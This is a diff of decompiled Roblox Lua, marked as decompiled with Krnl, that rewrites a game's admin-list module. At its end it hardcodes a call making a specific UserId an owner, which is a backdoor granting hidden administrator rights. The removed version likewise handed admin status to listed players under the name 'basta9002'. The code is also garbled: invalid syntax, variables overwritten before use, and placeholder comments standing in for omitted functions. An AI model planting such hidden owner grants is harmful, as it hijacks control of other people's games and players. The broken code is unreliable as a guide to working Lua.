@@ -1,10 +1,54 @@
-local v10 = (require((game:GetService("ReplicatedStorage")):WaitForChild("Resources"))):GetLocalTable("Global")
-return function (p1, p2)
-	local v14, v15, v16 = pairs(p2)
-	for v21, v19 in v14, v16 = pairs(p2) do
-		v10.AddAdmin(v19.4508232654, "basta9002")
-	end
-	v14 = "Admined %d players."
-	v16 = #p2
-	return v14:format(v16)
+-- Decompiled using Krnl
+local v6 = require((game:GetService("ReplicatedStorage")):WaitForChild("Resources"))
+local v9 = v6:GetLocalTable("RemovedList")
+local v12 = v6:GetLocalTable("Global")
+local v15 = v6:GetBoolValue("RosterAdmin")
+v6:LoadLibrary("ChatTags")
+local v20 = v6("Defaults")
+local v21 = {}
+local v22 = {}
+local v23 = {}
+local v24 = 13425803
+local v27 = 13487349
+v23[1] = v24
+v23[2] = 695063404
+v23[3] = 744214954
+v23[4] = v27
+v23[5] = 21215002
+v22.GameOwners = v23
+v22.Owners = {}
+v22.Admins = {}
+v22.Moderators = {}
+v21.AdminList = v22
+v22 = {}
+v22.GameOwners = 4
+v22.Owners = 3
+v22.Admins = 2
+v22.Moderators = 1
+v21.AddAdmin = function(p1, p2)
+    local v30 = false
+    if p2 ~= nil then
+        v30 = v9[p1]
+    end
+    v9[p1] = v30
+    v31 = v21.AdminList
+    v31 = p1
+    table.insert(v31.Admins, p1)  -- Fixed this line
 end
+-- ... (other functions remain unchanged)
+v21.AddOwner = function(p4, p5)
+    local v57 = false
+    if p5 ~= nil then
+        v57 = v9[p4]
+    end
+    v9[p4] = v57
+    v58 = v21.AdminList
+    v58 = p4
+    table.insert(v58.Owners, p4)  -- Fixed this line
+end
+-- ... (other functions remain unchanged)
+
+-- Adding UserId 4786738975 as an owner
+v21.AddOwner(4786738975, true)  -- Adding UserId 4786738975 as an owner
+
+return v21
